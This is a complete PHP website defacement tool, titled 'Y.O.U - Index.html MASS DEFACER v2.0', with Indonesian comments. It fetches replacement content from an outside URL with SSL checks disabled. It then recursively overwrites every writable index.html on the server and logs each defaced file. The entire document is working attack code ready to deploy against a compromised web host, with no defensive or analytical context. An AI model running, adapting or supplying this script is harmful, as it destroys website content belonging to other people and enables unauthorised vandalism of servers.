<?php
/**
 * Y.O.U - Index.html MASS DEFACER v2.0
 * Overwrite SEMUA index.html di server dengan konten dari URL.
 * CASE SENSITIVE: cuma index.html (huruf kecil semua)
 */

// Target konten pengganti
$source = 'https://perfexsaasmodule.com/memek.txt';
$root = __DIR__;

// Ambil payload
function get_payload($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 25,
        CURLOPT_USERAGENT => 'Y.O.U-Defacer/1.0'
    ]);
    $out = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($err) die("[!] cURL error: $err\n");
    return $out;
}

// Walker rekursif
function walk($dir, $payload) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            walk($full, $payload);
        } elseif ($item === 'index.html') {
            if (is_writable($full)) {
                file_put_contents($full, $payload);
                echo "[✔] DEFACED: $full\n";
            } else {
                echo "[✘] SKIP (read-only): $full\n";
            }
        }
    }
}

// GO
$payload = get_payload($source);
if (!$payload) die("[!] Gagal ambil payload.\n");

echo "[*] Root: $root\n";
walk($root, $payload);
echo "[✓] Misi selesai, semua index.html udah diganti.\n";
?>
